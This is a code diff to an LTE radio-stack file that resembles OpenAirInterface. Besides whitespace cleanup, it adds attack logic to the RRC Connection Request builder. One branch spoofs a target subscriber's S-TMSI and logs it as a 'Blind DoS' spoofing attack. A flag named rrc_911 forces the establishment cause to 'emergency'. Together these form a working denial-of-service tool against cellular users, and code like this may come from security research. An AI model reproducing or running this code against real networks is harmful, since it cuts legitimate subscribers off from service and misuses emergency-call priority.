@@ -106,6 +106,8 @@
 #include "common/ran_context.h"
 #include "key_nas_deriver.h"
 
+#include "attack_extern.h"	/* tmsi_blind_dos_rrc, rrc_911 */
+
 #if !defined (msg)
   #define msg printf
 #endif
@@ -619,21 +621,21 @@ LTE_DRX_Config_t *do_DrxConfig(int CC_id,
   }
 
   /* Check the UE capabilities, CDRX not implemented for Coverage Extension */
-  LTE_UE_EUTRA_Capability_v920_IEs_t	*cap_920 = NULL;
-  LTE_UE_EUTRA_Capability_v940_IEs_t	*cap_940 = NULL;
-  LTE_UE_EUTRA_Capability_v1020_IEs_t	*cap_1020 = NULL;
-  LTE_UE_EUTRA_Capability_v1060_IEs_t	*cap_1060 = NULL;
-  LTE_UE_EUTRA_Capability_v1090_IEs_t	*cap_1090 = NULL;
-  LTE_UE_EUTRA_Capability_v1130_IEs_t	*cap_1130 = NULL;
-  LTE_UE_EUTRA_Capability_v1170_IEs_t	*cap_1170 = NULL;
-  LTE_UE_EUTRA_Capability_v1180_IEs_t	*cap_1180 = NULL;
-  LTE_UE_EUTRA_Capability_v11a0_IEs_t	*cap_11a0 = NULL;
-  LTE_UE_EUTRA_Capability_v1250_IEs_t	*cap_1250 = NULL;
-  LTE_UE_EUTRA_Capability_v1260_IEs_t	*cap_1260 = NULL;
-  LTE_UE_EUTRA_Capability_v1270_IEs_t	*cap_1270 = NULL;
-  LTE_UE_EUTRA_Capability_v1280_IEs_t	*cap_1280 = NULL;
-  LTE_UE_EUTRA_Capability_v1310_IEs_t	*cap_1310 = NULL;
-  LTE_CE_Parameters_r13_t	*CE_param = NULL;
+  LTE_UE_EUTRA_Capability_v920_IEs_t    *cap_920 = NULL;
+  LTE_UE_EUTRA_Capability_v940_IEs_t    *cap_940 = NULL;
+  LTE_UE_EUTRA_Capability_v1020_IEs_t   *cap_1020 = NULL;
+  LTE_UE_EUTRA_Capability_v1060_IEs_t   *cap_1060 = NULL;
+  LTE_UE_EUTRA_Capability_v1090_IEs_t   *cap_1090 = NULL;
+  LTE_UE_EUTRA_Capability_v1130_IEs_t   *cap_1130 = NULL;
+  LTE_UE_EUTRA_Capability_v1170_IEs_t   *cap_1170 = NULL;
+  LTE_UE_EUTRA_Capability_v1180_IEs_t   *cap_1180 = NULL;
+  LTE_UE_EUTRA_Capability_v11a0_IEs_t   *cap_11a0 = NULL;
+  LTE_UE_EUTRA_Capability_v1250_IEs_t   *cap_1250 = NULL;
+  LTE_UE_EUTRA_Capability_v1260_IEs_t   *cap_1260 = NULL;
+  LTE_UE_EUTRA_Capability_v1270_IEs_t   *cap_1270 = NULL;
+  LTE_UE_EUTRA_Capability_v1280_IEs_t   *cap_1280 = NULL;
+  LTE_UE_EUTRA_Capability_v1310_IEs_t   *cap_1310 = NULL;
+  LTE_CE_Parameters_r13_t       *CE_param = NULL;
   long *ce_a_param = NULL;
 
   cap_920 = UEcap->nonCriticalExtension;
@@ -2166,10 +2168,26 @@ uint8_t do_RRCConnectionRequest(uint8_t Mod_id, uint8_t *buffer, size_t buffer_s
   memset((void *)&ul_ccch_msg,0,sizeof(LTE_UL_CCCH_Message_t));
   ul_ccch_msg.message.present           = LTE_UL_CCCH_MessageType_PR_c1;
   ul_ccch_msg.message.choice.c1.present = LTE_UL_CCCH_MessageType__c1_PR_rrcConnectionRequest;
-  rrcConnectionRequest          = &ul_ccch_msg.message.choice.c1.choice.rrcConnectionRequest;
+  rrcConnectionRequest                  = &ul_ccch_msg.message.choice.c1.choice.rrcConnectionRequest;
   rrcConnectionRequest->criticalExtensions.present = LTE_RRCConnectionRequest__criticalExtensions_PR_rrcConnectionRequest_r8;
 
-  if (1) {
+  if (tmsi_blind_dos_rrc /* != 0 */) {
+    int tmsi = tmsi_blind_dos_rrc;
+    LOG_I(RRC, "[Blind DoS] Spoofing attack, target TMSI: %d\n", tmsi);
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.present = LTE_InitialUE_Identity_PR_s_TMSI;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.mmec.size = 1;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.mmec.bits_unused = 0;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.mmec.buf = buf;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.mmec.buf[0] = 1;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.size = 4;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.bits_unused = 0;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.buf = &buf[1];
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.buf[0] = (tmsi & 0xff000000) >> 24;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.buf[1] = (tmsi & 0x00ff0000) >> 16;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.buf[2] = (tmsi & 0x0000ff00) >> 8;
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.m_TMSI.buf[3] = (tmsi & 0x000000ff) >> 0;
+  }
+  else if (1) {
     rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.present = LTE_InitialUE_Identity_PR_randomValue;
     rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.randomValue.size = 5;
     rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.randomValue.bits_unused = 0;
@@ -2195,6 +2213,8 @@ uint8_t do_RRCConnectionRequest(uint8_t Mod_id, uint8_t *buffer, size_t buffer_s
   }
 
   rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.establishmentCause = LTE_EstablishmentCause_mo_Signalling; //EstablishmentCause_mo_Data;
+  if (rrc_911 /* emergency */)
+    rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.establishmentCause = LTE_EstablishmentCause_emergency;   //EstablishmentCause_emergency;
   rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.spare.buf = &buf2;
   rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.spare.size=1;
   rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.spare.bits_unused = 7;
